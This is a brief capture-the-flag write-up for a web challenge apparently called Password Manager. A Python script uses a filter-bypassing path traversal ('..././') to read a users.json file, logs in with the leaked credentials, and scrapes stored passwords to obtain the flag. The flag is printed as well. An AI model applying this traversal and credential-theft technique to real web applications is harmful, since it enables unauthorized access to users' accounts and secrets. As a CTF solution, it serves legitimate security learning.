---
created: 2025-01-04T20:01
updated: 2025-01-05T19:10
points: 50
solves: 357
---

A single replace is never good for security.

```
/."../"./ -> /../
```

```python
import re
import requests
s = requests.Session()
url = 'https://password-manager-web.chal.irisc.tf/..././users.json'
prep = requests.Request(method='GET', url=url).prepare()
prep.url = url
res = s.send(prep).json()
user, password = list(res.keys())[0], list(res.values())[0]
print(s.post('https://password-manager-web.chal.irisc.tf/login', json={'usr': user, 'pwd': password}))
text = s.get('https://password-manager-web.chal.irisc.tf/getpasswords').text
print(re.findall(r'\w+{[^}]*}', text))
```

```flag
irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}
```
